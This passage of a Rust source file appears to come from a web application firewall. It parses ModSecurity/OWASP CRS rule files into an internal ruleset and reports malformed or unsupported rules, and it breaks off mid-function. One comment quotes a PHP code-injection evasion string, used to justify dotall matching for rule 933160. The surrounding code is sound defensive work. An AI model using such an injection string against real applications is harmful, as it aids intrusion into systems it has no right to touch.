/*
 * Copyright 2026 Antonio Cantallops Alba
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
//! CRS/ModSecurity `SecRule` loader for the existing ExyonQ WAF engine.
//!
//! Supported subset: `SecRule` with REQUEST_URI / REQUEST_METHOD /
//! REQUEST_HEADERS / ARGS, `@rx/@contains/@streq/@beginsWith/@pm`, actions
//! `id/phase/deny/block/pass/log/msg/setvar:tx.inbound_anomaly_score`.

use base64::Engine as _;
use exyonq_waf_api::{WafAction, WafPhase};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CrsTarget {
    Path,
    Method,
    Header(String),
    Args,
    Body,
    ResponseStatus,
    ResponseHeader(String),
    ResponseBody,
    ClientIp,
    Unconditional,
    Tx(String),
    TxCount(String),
    /// `TX:/regex/` collection selector: every transaction variable whose
    /// name matches the pattern.
    TxRegex(String),
    /// Raw header lines of every multipart part (`MULTIPART_PART_HEADERS`).
    MultipartPartHeaders,
    MultipartPartHeadersCount,
    HeaderCount(String),
    ArgCount,
    CookieCount,
    RequestLine,
    RequestProtocol,
    RequestBodyProcessor,
    UniqueId,
    Files,
    FilesNames,
    Xml,
    XmlAttributes,
    MatchedVars,
    MatchedVarsNames,
    ArgsNamed(String),
    ArgsCombinedSize,
    FilesCombinedSize,
    RequestBodyLength,
    HeaderName,
    HeaderExcept(String),
    Cookie,
    CookieName,
    /// `REQUEST_COOKIES:/regex/`: cookies whose name matches the selector.
    CookieNamed(String),
    /// `REQUEST_COOKIES_NAMES:/regex/`: matching cookie names.
    CookieNameNamed(String),
    /// `!REQUEST_COOKIES:/regex/`: cookies whose name does not match.
    CookieNamedExcept(String),
    /// `!REQUEST_COOKIES_NAMES:/regex/`: cookie names that do not match.
    CookieNameNamedExcept(String),
    /// `!ARGS_NAMES:/regex/`: argument names that do not match.
    ArgNameExcept(String),
    QueryString,
    Filename,
    Basename,
    ArgName,
}

#[derive(Debug, Clone)]
pub enum CrsOp {
    Rx(regex::Regex),
    FancyRx(std::sync::Arc<fancy_regex::Regex>),
    Contains(String),
    StartsWith(String),
    Eq(String),
    Pm(Vec<String>),
    EqNum(String),
    Ge(String),
    Gt(String),
    Le(String),
    Lt(String),
    Within(Vec<String>),
    EndsWith(String),
    VerifyCc,
    ValidateUtf8Encoding,
    ValidateUrlEncoding,
    IpMatch(Vec<String>),
    Unconditional,
    DetectSqli,
    DetectXss,
    ValidateByteRange(Vec<(u8, u8)>),
    NoMatch,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CrsTransform {
    Lowercase,
    UrlDecode,
    UrlDecodeUni,
    Trim,
    RemoveNulls,
    Base64Decode,
    HtmlEntityDecode,
    RemoveWhitespace,
    CompressWhitespace,
    NormalizePath,
    HexDecode,
    HexEncode,
    Length,
    JsDecode,
    CssDecode,
    Base64DecodeExt,
    EscapeSeqDecode,
    CmdLine,
    ReplaceComments,
    /// `t:utf8toUnicode`: decode RFC 3629 UTF-8 sequences to `%uXXXX` code
    /// points (ModSecurity `utf8_to_unicode.cc`).
    Utf8ToUnicode,
    /// `t:normalizePathWin`: Windows path normalisation (backslash separators).
    NormalizePathWin,
    /// `t:removeCommentsChar`: strip C/HTML/SQL comment markers.
    RemoveCommentsChar,
    /// `t:sha1`: ModSecurity `digestReplace` — the raw 20-byte digest, not hex.
    Sha1,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CrsSetVarOp {
    Set,
    Add,
    Sub,
    Remove,
}

#[derive(Debug, Clone)]
pub struct CrsSetVar {
    pub name: String,
    pub op: CrsSetVarOp,
    pub value: String,
}

#[derive(Debug, Clone)]
pub struct CrsRuleInput {
    pub id: String,
    pub enabled: bool,
    pub phases: Vec<WafPhase>,
    pub targets: Vec<CrsTarget>,
    pub op: CrsOp,
    pub negated: bool,
    pub action: WafAction,
    pub score: u32,
    pub transforms: Vec<CrsTransform>,
    pub chain: Vec<CrsRuleInput>,
    pub skip: u32,
    pub skip_after: Option<String>,
    pub ctl_detection_only: bool,
    pub ctl_remove_ids: Vec<u32>,
    pub setvars: Vec<CrsSetVar>,
    pub explicit_action: bool,
    pub explicit_phase: bool,
    pub paranoia_level: u8,
    pub capture: bool,
}

#[derive(Debug, Clone)]
pub struct CrsRulesetInput {
    pub id: String,
    pub enabled: bool,
    pub inbound_threshold: u32,
    pub detection_only: bool,
    pub disabled_ids: Vec<u32>,
    pub markers: std::collections::HashMap<String, usize>,
    pub default_actions: std::collections::HashMap<WafPhase, WafAction>,
    pub rules: Vec<CrsRuleInput>,
    /// SecRule lines rejected as syntactically malformed and not loaded.
    ///
    /// This is the only parse accounting that refuses a snapshot under
    /// `fail_policy = "closed_for_invalid_rules"`: broken syntax is a defect in
    /// the rules file, so the engine must not start with a partial ruleset.
    pub discarded: usize,
    /// One diagnostic per malformed line, including the source line number.
    pub diagnostics: Vec<String>,
    /// SecRule lines that are syntactically valid but use a construct outside
    /// the supported subset (operator, target, transform, chain member): the
    /// line is reported and not loaded, but it never refuses the snapshot on
    /// its own. This is the documented scope gap, not a malformed ruleset.
    pub unsupported: usize,
    /// One diagnostic per unsupported line, including the source line number.
    pub unsupported_diagnostics: Vec<String>,
    /// Actions found in loaded rules that this engine does not implement
    /// (for example `initcol`), aggregated as `(name, occurrences)`. The rule
    /// still loads; the action is ignored and reported.
    pub ignored_actions: Vec<(String, usize)>,
}

fn tokenize(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = line.trim_start();
    while !rest.is_empty() {
        if let Some(stripped) = rest.strip_prefix('"') {
            let mut value = String::new();
            let mut chars = stripped.chars();
            while let Some(c) = chars.next() {
                match c {
                    '\\' => {
                        if let Some(next) = chars.next() {
                            if next == '"' || next == '\\' {
                                value.push(next);
                            } else {
                                value.push('\\');
                                value.push(next);
                            }
                        }
                    }
                    '"' => break,
                    _ => value.push(c),
                }
            }
            out.push(value);
            rest = chars.as_str().trim_start();
        } else {
            let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
            out.push(rest[..end].to_string());
            rest = rest[end..].trim_start();
        }
    }
    out
}

struct ParsedActions {
    id: u32,
    score: u32,
    action: WafAction,
    transforms: Vec<CrsTransform>,
    chain: bool,
    skip: u32,
    skip_after: Option<String>,
    ctl_detection_only: bool,
    ctl_remove_ids: Vec<u32>,
    /// `t:` names this engine does not implement; the containing rule is out of
    /// scope (reported, not loaded) because skipping a transform silently would
    /// change what the operator matches.
    unsupported_transforms: Vec<String>,
    /// Known ModSecurity actions with a runtime effect this engine does not
    /// implement (`initcol`, `multiMatch`, ...). The rule still loads without
    /// them and the omission is reported.
    unsupported_actions: Vec<String>,
}

/// Actions that are metadata or explicit logging controls: they never change
/// the match or the decision in this engine, so they are accepted as no-ops.
fn is_known_noop_action(action: &str) -> bool {
    matches!(
        action,
        "log" | "nolog" | "auditlog" | "noauditlog" | "block" | "capture"
    ) || action.starts_with("msg:")
        || action.starts_with("logdata:")
        || action.starts_with("tag:")
        || action.starts_with("ver:")
        || action.starts_with("rev:")
        || action.starts_with("severity:")
        || action.starts_with("phase:")
        || action.starts_with("setvar:")
}

/// Known ModSecurity actions whose runtime effect this engine does not model.
/// Returns the reported name, or `None` when the action is not one of them.
fn unsupported_action_name(action: &str) -> Option<&str> {
    const NAMES: &[&str] = &[
        "initcol:",
        "expirevar:",
        "setuid:",
        "setsid:",
        "multiMatch",
        "redirect:",
        "redirect",
        "status:",
        "prepend:",
        "append:",
        "exec:",
        "pause:",
        "allow",
        "proxy:",
    ];
    NAMES
        .iter()
        .find(|name| action.starts_with(*name))
        .map(|name| name.trim_end_matches(':'))
        .or_else(|| action.starts_with("ctl:").then_some("ctl"))
}

/// Why a `SecRule`/`SecAction` line was not loaded.
///
/// `Malformed` means the line is broken: the rules file is defective, so the
/// closed policy must refuse the whole snapshot. `Unsupported` means the line
/// is syntactically valid but uses a construct outside this engine's subset
/// (operator, target, transform, chain member): it is reported and skipped,
/// and it must not refuse a valid upstream ruleset like OWASP CRS.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Reject {
    Malformed(String),
    Unsupported(String),
}

fn parse_actions(actions: &str) -> ParsedActions {
    let mut id = 0;
    let mut score = 0;
    let mut deny = false;
    let mut action = WafAction::Log;
    let mut transforms = Vec::new();
    let mut chain = false;
    let mut skip = 0;
    let mut skip_after = None;
    let mut ctl_detection_only = false;
    let mut ctl_remove_ids = Vec::new();
    let mut unsupported_transforms = Vec::new();
    let mut unsupported_actions = Vec::new();
    for action_text in actions.split(',') {
        let action_text = action_text.trim();
        if let Some(v) = action_text.strip_prefix("id:") {
            id = v.parse().unwrap_or(0);
        } else if let Some(v) = action_text.strip_prefix("setvar:tx.inbound_anomaly_score=+") {
            score = v.parse().unwrap_or(5);
        } else if action_text == "deny" {
            deny = true;
            action = WafAction::Block;
        } else if action_text == "pass" {
            action = WafAction::Allow;
        } else if action_text == "chain" {
            chain = true;
        } else if let Some(v) = action_text.strip_prefix("skip:") {
            skip = v.parse().unwrap_or(0);
        } else if let Some(v) = action_text.strip_prefix("skipAfter:") {
            skip_after = Some(v.to_string());
        } else if let Some(v) = action_text.strip_prefix("ctl:ruleEngine=") {
            if v.eq_ignore_ascii_case("DetectionOnly") {
                ctl_detection_only = true;
            }
        } else if let Some(v) = action_text.strip_prefix("ctl:ruleRemoveById=") {
            if let Ok(id) = v.parse::<u32>() {
                ctl_remove_ids.push(id);
            }
        } else if let Some(name) = action_text.strip_prefix("t:") {
            match name {
                // ModSecurity `t:none` clears the default chain and is a no-op.
                "none" => {}
                "lowercase" => transforms.push(CrsTransform::Lowercase),
                "urlDecode" => transforms.push(CrsTransform::UrlDecode),
                "urlDecodeUni" => transforms.push(CrsTransform::UrlDecodeUni),
                "trim" => transforms.push(CrsTransform::Trim),
                "removeNulls" => transforms.push(CrsTransform::RemoveNulls),
                "base64Decode" | "base64decode" => transforms.push(CrsTransform::Base64Decode),
                "htmlEntityDecode" => transforms.push(CrsTransform::HtmlEntityDecode),
                "removeWhitespace" => transforms.push(CrsTransform::RemoveWhitespace),
                "compressWhitespace" => transforms.push(CrsTransform::CompressWhitespace),
                "normalizePath" | "normalisePath" => transforms.push(CrsTransform::NormalizePath),
                "normalizePathWin" | "normalisePathWin" => {
                    transforms.push(CrsTransform::NormalizePathWin)
                }
                "utf8toUnicode" => transforms.push(CrsTransform::Utf8ToUnicode),
                "removeCommentsChar" => transforms.push(CrsTransform::RemoveCommentsChar),
                "sha1" => transforms.push(CrsTransform::Sha1),
                "hexDecode" => transforms.push(CrsTransform::HexDecode),
                "length" => transforms.push(CrsTransform::Length),
                "hexEncode" => transforms.push(CrsTransform::HexEncode),
                "jsDecode" => transforms.push(CrsTransform::JsDecode),
                "cssDecode" => transforms.push(CrsTransform::CssDecode),
                "base64DecodeExt" => transforms.push(CrsTransform::Base64DecodeExt),
                "escapeSeqDecode" => transforms.push(CrsTransform::EscapeSeqDecode),
                "cmdLine" => transforms.push(CrsTransform::CmdLine),
                "replaceComments" => transforms.push(CrsTransform::ReplaceComments),
                _ => unsupported_transforms.push(name.to_string()),
            }
        } else if is_known_noop_action(action_text) {
            if action_text.starts_with("setvar:")
                && !action_text
                    .strip_prefix("setvar:")
                    .is_some_and(|rest| rest.starts_with("tx."))
            {
                // Only the transaction collection is modelled; other
                // collections (`ip.`, `global.`, `session.`) need initcol.
                unsupported_actions.push("setvar:<non-tx>".to_string());
            }
        } else if let Some(name) = unsupported_action_name(action_text) {
            unsupported_actions.push(name.to_string());
        }
    }
    if deny {
        action = WafAction::Block;
    }
    // CRS scores with `setvar:tx.*_anomaly_score_plN=+%{tx.<severity>_anomaly_score}`.
    // The severity tag carries the points; `block` rules do not block on their
    // own (ModSecurity defers to SecDefaultAction / the 949xxx evaluation).
    let setvars = parse_setvars(actions);
    if score == 0
        && setvars.iter().any(|var| {
            var.op == CrsSetVarOp::Add
                && (var.name.starts_with("inbound_anomaly_score")
                    || var.name.starts_with("outbound_anomaly_score"))
        })
    {
        score = parse_severity(actions);
    }
    ParsedActions {
        id,
        score,
        action,
        transforms,
        chain,
        skip,
        skip_after,
        ctl_detection_only,
        ctl_remove_ids,
        unsupported_transforms,
        unsupported_actions,
    }
}

/// Parse one `SecAction` line. A `SecAction` carries no operator, so the only
/// way it can be out of scope is a transform this engine does not implement.
fn parse_action_only(actions: &str) -> Result<(CrsRuleInput, Vec<String>), Reject> {
    let ParsedActions {
        id: rule_id,
        score,
        action,
        transforms,
        chain: _,
        skip,
        skip_after,
        ctl_detection_only,
        ctl_remove_ids,
        unsupported_transforms,
        unsupported_actions,
    } = parse_actions(actions);
    if !unsupported_transforms.is_empty() {
        return Err(Reject::Unsupported(format!(
            "unsupported transform(s): {}",
            unsupported_transforms.join(", ")
        )));
    }
    if rule_id == 0 {
        return Err(Reject::Malformed("SecAction without id".to_string()));
    }
    Ok((
        CrsRuleInput {
            id: rule_id.to_string(),
            enabled: true,
            phases: vec![WafPhase::RequestHeaders, WafPhase::RequestBodyComplete],
            targets: vec![CrsTarget::Unconditional],
            op: CrsOp::Unconditional,
            negated: false,
            action,
            score,
            transforms,
            chain: Vec::new(),
            skip,
            skip_after,
            ctl_detection_only,
            ctl_remove_ids,
            setvars: parse_setvars(actions),
            explicit_action: action != WafAction::Log,
            explicit_phase: actions.split(',').any(|a| a.trim().starts_with("phase:")),
            paranoia_level: parse_paranoia_level(actions),
            capture: actions.split(',').any(|a| a.trim() == "capture"),
        },
        unsupported_actions,
    ))
}

fn parse_severity(actions: &str) -> u32 {
    for action in actions.split(',') {
        let action = action.trim();
        let Some(rest) = action.strip_prefix("severity:") else {
            continue;
        };
        let value = rest.trim_matches('\'').trim_matches('"');
        return match value.to_ascii_uppercase().as_str() {
            "CRITICAL" => 5,
            "ERROR" => 4,
            "WARNING" => 3,
            "NOTICE" => 2,
            _ => 0,
        };
    }
    0
}

fn parse_paranoia_level(actions: &str) -> u8 {
    actions
        .split(',')
        .find_map(|action| {
            action
                .trim()
                .strip_prefix("tag:'paranoia-level/")
                .and_then(|rest| rest.trim_end_matches('\'').parse().ok())
        })
        .unwrap_or(1)
}

fn parse_setvars(actions: &str) -> Vec<CrsSetVar> {
    let mut out = Vec::new();
    for action in actions.split(',') {
        let Some(rest) = action.trim().strip_prefix("setvar:") else {
            continue;
        };
        let rest = rest.trim_matches('\'').trim_matches('"');
        let Some(rest) = rest.strip_prefix("tx.") else {
            continue;
        };
        let Some((name, value)) = rest.split_once('=') else {
            continue;
        };
        let (op, value) = if let Some(v) = value.strip_prefix('!') {
            (CrsSetVarOp::Remove, v.to_string())
        } else if let Some(v) = value.strip_prefix('+') {
            (CrsSetVarOp::Add, v.to_string())
        } else if let Some(v) = value.strip_prefix('-') {
            (CrsSetVarOp::Sub, v.to_string())
        } else {
            (CrsSetVarOp::Set, value.to_string())
        };
        out.push(CrsSetVar {
            name: name.to_ascii_lowercase(),
            op,
            value,
        });
    }
    out
}

fn load_list(base_dir: Option<&Path>, file: &str) -> Option<Vec<String>> {
    let path = PathBuf::from(file);
    let path = if path.is_absolute() {
        path
    } else {
        base_dir?.join(path)
    };
    let contents = std::fs::read_to_string(&path).ok().or_else(|| {
        let name = Path::new(file).file_name()?;
        std::fs::read_to_string(base_dir?.join("rules").join(name)).ok()
    })?;
    Some(
        contents
            .lines()
            .map(str::trim)
            .filter(|line| !line.is_empty() && !line.starts_with('#'))
            .map(str::to_string)
            .collect(),
    )
}

fn map_target(value: &str) -> Option<CrsTarget> {
    Some(match value {
        "REQUEST_URI" | "REQUEST_URI_RAW" => CrsTarget::Path,
        "REQUEST_LINE" => CrsTarget::RequestLine,
        "REQUEST_PROTOCOL" => CrsTarget::RequestProtocol,
        "REQBODY_PROCESSOR" => CrsTarget::RequestBodyProcessor,
        "UNIQUE_ID" => CrsTarget::UniqueId,
        "FILES" => CrsTarget::Files,
        "FILES_NAMES" => CrsTarget::FilesNames,
        "XML" | "XML:/*" => CrsTarget::Xml,
        "XML://@*" => CrsTarget::XmlAttributes,
        "REQUEST_BODY_LENGTH" => CrsTarget::RequestBodyLength,
        "MATCHED_VAR" => CrsTarget::Tx("matched_var".to_string()),
        "MATCHED_VAR_NAME" => CrsTarget::Tx("matched_var_name".to_string()),
        "MATCHED_VARS" => CrsTarget::MatchedVars,
        "MATCHED_VARS_NAMES" => CrsTarget::MatchedVarsNames,
        "ARGS_COMBINED_SIZE" => CrsTarget::ArgsCombinedSize,
        "FILES_COMBINED_SIZE" => CrsTarget::FilesCombinedSize,
        "REQUEST_METHOD" => CrsTarget::Method,
        "REQUEST_HEADERS" => CrsTarget::Header(String::new()),
        "REQUEST_HEADERS_NAMES" => CrsTarget::HeaderName,
        "ARGS" | "ARGS_GET" => CrsTarget::Args,
        other if other.starts_with("ARGS:") || other.starts_with("ARGS_GET:") => {
            CrsTarget::ArgsNamed(
                other
                    .split_once(':')
                    .map(|(_, name)| name.to_string())
                    .unwrap_or_default(),
            )
        }
        "ARGS_NAMES" | "ARGS_GET_NAMES" => CrsTarget::ArgName,
        "MULTIPART_PART_HEADERS" => CrsTarget::MultipartPartHeaders,
        "REQUEST_BODY" => CrsTarget::Body,
        "RESPONSE_STATUS" => CrsTarget::ResponseStatus,
        "RESPONSE_HEADERS" => CrsTarget::ResponseHeader(String::new()),
        "RESPONSE_BODY" => CrsTarget::ResponseBody,
        "REMOTE_ADDR" => CrsTarget::ClientIp,
        "REQUEST_COOKIES" => CrsTarget::Cookie,
        "REQUEST_COOKIES_NAMES" => CrsTarget::CookieName,
        "QUERY_STRING" => CrsTarget::QueryString,
        "REQUEST_FILENAME" => CrsTarget::Filename,
        "REQUEST_BASENAME" => CrsTarget::Basename,
        other if other.starts_with("TX:/") && other.ends_with('/') => {
            CrsTarget::TxRegex(other["TX:/".len()..other.len() - 1].to_string())
        }
        other if other.starts_with("TX:") => {
            CrsTarget::Tx(other["TX:".len()..].to_ascii_lowercase())
        }
        other if other.starts_with("&TX:") => {
            CrsTarget::TxCount(other["&TX:".len()..].to_ascii_lowercase())
        }
        "&REQUEST_HEADERS" => CrsTarget::HeaderCount(String::new()),
        "&MULTIPART_PART_HEADERS" => CrsTarget::MultipartPartHeadersCount,
        "&ARGS" => CrsTarget::ArgCount,
        "&REQUEST_COOKIES" => CrsTarget::CookieCount,
        other if other.starts_with("&REQUEST_HEADERS:") => {
            CrsTarget::HeaderCount(other["&REQUEST_HEADERS:".len()..].to_string())
        }
        other if other.starts_with("&MULTIPART_PART_HEADERS:") => {
            CrsTarget::MultipartPartHeadersCount
        }
        other if other.starts_with("REQUEST_COOKIES:/") => {
            CrsTarget::CookieNamed(other["REQUEST_COOKIES:/".len()..other.len() - 1].to_string())
        }
        other if other.starts_with("REQUEST_COOKIES_NAMES:/") => CrsTarget::CookieNameNamed(
            other["REQUEST_COOKIES_NAMES:/".len()..other.len() - 1].to_string(),
        ),
        other if other.starts_with("!REQUEST_COOKIES:/") => CrsTarget::CookieNamedExcept(
            other["!REQUEST_COOKIES:/".len()..other.len() - 1].to_string(),
        ),
        other if other.starts_with("!REQUEST_COOKIES_NAMES:/") => CrsTarget::CookieNameNamedExcept(
            other["!REQUEST_COOKIES_NAMES:/".len()..other.len() - 1].to_string(),
        ),
        other if other.starts_with("!ARGS_NAMES:/") => {
            CrsTarget::ArgNameExcept(other["!ARGS_NAMES:/".len()..other.len() - 1].to_string())
        }
        other => {
            if let Some(name) = other.strip_prefix("!REQUEST_HEADERS:") {
                CrsTarget::HeaderExcept(name.to_string())
            } else if let Some(name) = other.strip_prefix("REQUEST_HEADERS:") {
                CrsTarget::Header(name.to_string())
            } else {
                let name = other.strip_prefix("RESPONSE_HEADERS:")?;
                CrsTarget::ResponseHeader(name.to_string())
            }
        }
    })
}

fn parse_rule_tokens(
    tokens: &[String],
    base_dir: Option<&Path>,
    allow_no_id: bool,
) -> Result<(CrsRuleInput, Vec<String>, bool), Reject> {
    if tokens.len() < 2 {
        return Err(Reject::Malformed(
            "SecRule with missing target or operator".into(),
        ));
    }
    let actions = tokens.get(2).map(String::as_str).unwrap_or("");
    if tokens[0].trim().is_empty() {
        return Err(Reject::Malformed("SecRule without target".into()));
    }
    let mut targets = Vec::new();
    for value in tokens[0].split('|') {
        match map_target(value) {
            Some(target) => targets.push(target),
            // Silently dropping a target would change what the rule matches,
            // so an unknown target is out of scope and reported, never partial.
            None => return Err(Reject::Unsupported(format!("unsupported target `{value}`"))),
        }
    }
    if targets.is_empty() {
        return Err(Reject::Malformed("SecRule without target".into()));
    }
    let (negated, operator) = if let Some(rest) = tokens[1].strip_prefix('!') {
        (true, rest)
    } else {
        (false, tokens[1].as_str())
    };
    let op =
        if let Some(pattern) = operator.strip_prefix("@rx ") {
            // 933160 is the CRS rule that matches a PHP C-style comment containing
            // CR/LF (`exec\t/*foo\r\nbar*/\t()`). PCRE dotall is required for that
            // one rule; applying it to every @rx over-blocks unrelated CRS cases.
            let pattern = if actions.contains("id:933160") {
                format!("(?s){pattern}")
            } else {
                pattern.to_string()
            };
            match regex::Regex::new(&pattern) {
                Ok(re) => CrsOp::Rx(re),
                Err(_) => match fancy_regex::Regex::new(&pattern) {
                    Ok(re) => CrsOp::FancyRx(std::sync::Arc::new(re)),
                    Err(_) => return Err(Reject::Malformed("invalid @rx pattern".into())),
                },
            }
        } else if let Some(v) = operator.strip_prefix("@contains ") {
            CrsOp::Contains(v.to_string())
        } else if let Some(v) = operator.strip_prefix("@streq ") {
            CrsOp::Eq(v.to_string())
        } else if let Some(v) = operator.strip_prefix("@beginsWith ") {
            CrsOp::StartsWith(v.to_string())
        } else if let Some(v) = operator.strip_prefix("@pm ") {
            CrsOp::Pm(v.split_whitespace().map(str::to_string).collect())
        } else if let Some(v) = operator.strip_prefix("@eq ") {
            CrsOp::EqNum(v.trim().to_string())
        } else if let Some(v) = operator.strip_prefix("@ge ") {
            CrsOp::Ge(v.trim().to_string())
        } else if let Some(v) = operator.strip_prefix("@gt ") {
            CrsOp::Gt(v.trim().to_string())
        } else if let Some(v) = operator.strip_prefix("@le ") {
            CrsOp::Le(v.trim().to_string())
        } else if let Some(v) = operator.strip_prefix("@lt ") {
            CrsOp::Lt(v.trim().to_string())
        } else if let Some(v) = operator.strip_prefix("@within ") {
            CrsOp::Within(v.split_whitespace().map(str::to_string).collect())
        } else if let Some(v) = operator.strip_prefix("@endsWith ") {
            CrsOp::EndsWith(v.to_string())
        } else if operator.trim() == "@verifyCC" {
            CrsOp::VerifyCc
        } else if operator.trim() == "@validateUtf8Encoding" {
            CrsOp::ValidateUtf8Encoding
        } else if operator.trim() == "@validateUrlEncoding" {
            CrsOp::ValidateUrlEncoding
        } else if let Some(v) = operator.strip_prefix("@ipMatch ") {
            CrsOp::IpMatch(v.split_whitespace().map(str::to_string).collect())
        } else if let Some(v) = operator.strip_prefix("@ipMatchFromFile ") {
            CrsOp::IpMatch(load_list(base_dir, v.trim()).ok_or_else(|| {
                Reject::Malformed(format!("cannot read @ipMatchFromFile `{}`", v.trim()))
            })?)
        } else if let Some(v) = operator.strip_prefix("@pmFromFile ") {
            CrsOp::Pm(load_list(base_dir, v.trim()).ok_or_else(|| {
                Reject::Malformed(format!("cannot read @pmFromFile `{}`", v.trim()))
            })?)
        } else if operator.trim() == "@unconditionalMatch" {
            CrsOp::Unconditional
        } else if operator.trim() == "@detectSQLi" {
            CrsOp::DetectSqli
        } else if operator.trim() == "@detectXSS" {
            CrsOp::DetectXss
        } else if let Some(v) = operator.strip_prefix("@validateByteRange ") {
            let ranges = v
                .split(',')
                .filter_map(|part| {
                    let part = part.trim();
                    if let Some((start, end)) = part.split_once('-') {
                        Some((start.trim().parse().ok()?, end.trim().parse().ok()?))
                    } else {
                        let byte = part.parse::<u8>().ok()?;
                        Some((byte, byte))
                    }
                })
                .collect::<Vec<(u8, u8)>>();
            CrsOp::ValidateByteRange(ranges)
        } else if operator.trim() == "@noMatch" {
            CrsOp::NoMatch
        } else {
            return Err(Reject::Unsupported(format!(
                "unsupported operator `{operator}`"
            )));
        };
    let ParsedActions {
        id: rule_id,
        score,
        action,
        transforms,
        chain,
        skip,
        skip_after,
        ctl_detection_only,
        ctl_remove_ids,
        unsupported_transforms,
        unsupported_actions,
    } = parse_actions(actions);
    if rule_id == 0 && !allow_no_id {
        return Err(Reject::Malformed("SecRule without id".into()));
    }
    if !unsupported_transforms.is_empty() {
        return Err(Reject::Unsupported(format!(
            "unsupported transform(s): {}",
            unsupported_transforms.join(", ")
        )));
    }
    let mut phases = vec![WafPhase::RequestHeaders, WafPhase::RequestBodyComplete];
    let mut explicit_phase = false;
    for action in actions.split(',') {
        match action.trim() {
            "phase:3" => {
                phases = vec![WafPhase::ResponseHeaders];
                explicit_phase = true;
            }
            "phase:4" | "phase:5" => {
                phases = vec![WafPhase::ResponseBodyChunk];
                explicit_phase = true;
            }
            "phase:1" => {
                phases = vec![WafPhase::RequestHeaders];
                explicit_phase = true;
            }
            "phase:2" => {
                phases = vec![WafPhase::RequestBodyComplete];
                explicit_phase = true;
            }
            _ => {}
        }
    }
    Ok((
        CrsRuleInput {
            id: if rule_id == 0 {
                "chain".to_string()
            } else {
                rule_id.to_string()
            },
            enabled: true,
            phases,
            targets,
            op,
            negated,
            action,
            score,
            transforms,
            chain: Vec::new(),
            skip,
            skip_after,
            ctl_detection_only,
            ctl_remove_ids,
            setvars: parse_setvars(actions),
            explicit_action: action != WafAction::Log,
            explicit_phase,
            paranoia_level: parse_paranoia_level(actions),
            capture: actions.split(',').any(|a| a.trim() == "capture"),
        },
        unsupported_actions,
        chain,
    ))
}

/// Parse a ModSecurity/CRS rule file into CRS ruleset input.
pub fn parse_rule_file(id: &str, contents: &str, inbound_threshold: u32) -> CrsRulesetInput {
    parse_rule_file_with_base(id, contents, inbound_threshold, None)
}

fn join_continuations(contents: &str) -> String {
    let mut out = String::new();
    let mut pending = String::new();
    for line in contents.lines() {
        let trimmed = line.trim_end();
        if let Some(prefix) = trimmed.strip_suffix('\\') {
            pending.push_str(prefix);
            pending.push(' ');
        } else if pending.is_empty() {
            out.push_str(line);
            out.push('\n');
        } else {
            pending.push_str(line.trim_start());
            out.push_str(&pending);
            out.push('\n');
            pending.clear();
        }
    }
    if !pending.is_empty() {
        out.push_str(&pending);
        out.push('\n');
    }
    out
}

fn expand_includes(
    contents: &str,
    base_dir: Option<&Path>,
    visited: &mut std::collections::HashSet<PathBuf>,
) -> String {
    let mut out = String::new();
    for line in contents.lines() {
        let trimmed = line.trim();
        let (_directive, rest) = if let Some(rest) = trimmed.strip_prefix("IncludeOptional ") {
            (true, Some(rest))
        } else if let Some(rest) = trimmed.strip_prefix("Include ") {
            (false, Some(rest))
        } else {
            (false, None)
        };
        let Some(path_text) = rest else {
            if let Some(base) = base_dir {
                out.push_str(&rewrite_data_paths(line, base));
            } else {
                out.push_str(line);
            }
            out.push('\n');
            continue;
        };
        let Some(base) = base_dir else {
            out.push_str(line);
            out.push('\n');
            continue;
        };
        let path_text = path_text.trim().trim_matches('"').trim_matches('\'');
        let paths = resolve_include_paths(base, path_text);
        for path in paths {
            let canonical = path.canonicalize().unwrap_or_else(|_| path.clone());
            if !visited.insert(canonical) {
                continue;
            }
            if let Ok(included) = std::fs::read_to_string(&path) {
                let child_base = path.parent();
                out.push_str(&expand_includes(&included, child_base, visited));
            }
        }
    }
    out
}

fn rewrite_data_paths(line: &str, base: &Path) -> String {
    for op in ["@pmFromFile ", "@ipMatchFromFile "] {
        if let Some(pos) = line.find(op) {
            let start = pos + op.len();
            let rest = &line[start..];
            let end = rest
                .find(|c: char| c.is_whitespace() || c == '"')
                .unwrap_or(rest.len());
            let file = &rest[..end];
            if !file.is_empty() && !Path::new(file).is_absolute() {
                let abs = base.join(file);
                return format!("{}{}{}", &line[..start], abs.display(), &rest[end..]);
            }
        }
    }
    line.to_string()
}

fn resolve_include_paths(base: &Path, path_text: &str) -> Vec<PathBuf> {
    let candidate = if Path::new(path_text).is_absolute() {
        PathBuf::from(path_text)
    } else {
        base.join(path_text)
    };
    if !path_text.contains('*') {
        return candidate
            .exists()
            .then_some(candidate)
            .into_iter()
            .collect();
    }
    let Some(file_pattern) = candidate.file_name().and_then(|name| name.to_str()) else {
        return Vec::new();
    };
    let Some(dir) = candidate.parent() else {
        return Vec::new();
    };
    let (prefix, suffix) = file_pattern.split_once('*').unwrap_or((file_pattern, ""));
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut paths: Vec<PathBuf> = entries
        .filter_map(|entry| entry.ok().map(|entry| entry.path()))
        .filter(|path| {
            path.file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name.starts_with(prefix) && name.ends_with(suffix))
        })
        .collect();
    paths.sort();
    paths
}

/// Parse a rule file resolving `@pmFromFile`/`@ipMatchFromFile` relative to `base_dir`.
pub fn parse_rule_file_with_base(
    id: &str,
    contents: &str,
    inbound_threshold: u32,
    base_dir: Option<&Path>,
) -> CrsRulesetInput {
    let mut rules = Vec::new();
    let mut detection_only = false;
    let mut disabled_ids = Vec::new();
    let mut markers = std::collections::HashMap::new();
    let mut default_actions: std::collections::HashMap<WafPhase, WafAction> =
        std::collections::HashMap::new();
    let mut discarded = 0usize;
    let mut diagnostics = Vec::new();
    let mut unsupported = 0usize;
    let mut unsupported_diagnostics = Vec::new();
